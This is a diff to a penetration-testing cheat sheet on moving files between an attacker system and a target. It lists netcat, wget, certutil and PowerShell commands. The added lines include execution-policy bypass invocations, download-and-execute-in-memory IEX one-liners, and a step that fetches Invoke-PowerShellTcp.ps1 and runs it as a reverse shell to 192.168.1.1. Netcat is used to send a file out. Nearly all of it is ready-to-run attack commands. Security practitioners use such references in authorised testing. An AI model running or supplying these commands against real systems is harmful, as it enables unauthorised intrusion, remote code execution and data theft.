@@ -14,12 +14,6 @@ Python2
 > sudo python -m SimpleHTTPServer 80
 ```
 
-###### SMBserver
-```
-impacket-smbserver.py secure .
-impacket-smbserver.py secure . -smb2support
-```
-
 ###### netcat
 ```
 On the attacker system:
@@ -28,21 +22,32 @@ On the target system:
 > nc 192.168.1.1 80 < file.txt
 ```
 
+###### wget
+```
+> wget.exe http://192.168.1.1:80/file.txt
+> powershell.exe -exec bypass -Command "wget http://192.168.1.1:80/file.txt"
+```
+
 ###### certutil
 ```
-> certutil.exe -urlcache -f http://192.168.1.1/file.txt file.txt
+> certutil.exe -urlcache -f http://192.168.1.1:80/file.txt file.txt
+> powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.1.1:80/file.txt}"
 ```
 
 ###### Powershell
 ```
 Download
-> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/file.exe', 'C\file.exe')
+> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/Invoke-PowerShellTcp.ps1', 'C:\Invoke-PowerShellTcp.ps1')
+Run
+> Invoke-PowerShellTcp.ps1 -Reverse -IPAddress 192.168.1.1 -Port 443
 
-Execute
+Execute exe
 > powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
 file -File file.ps1
 
-Download and execute
-> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('
+Download and execute immediately
+> powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('
+http://192.168.1.1/file.exe')
+> powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('
 http://192.168.1.1/file.exe')
 ```
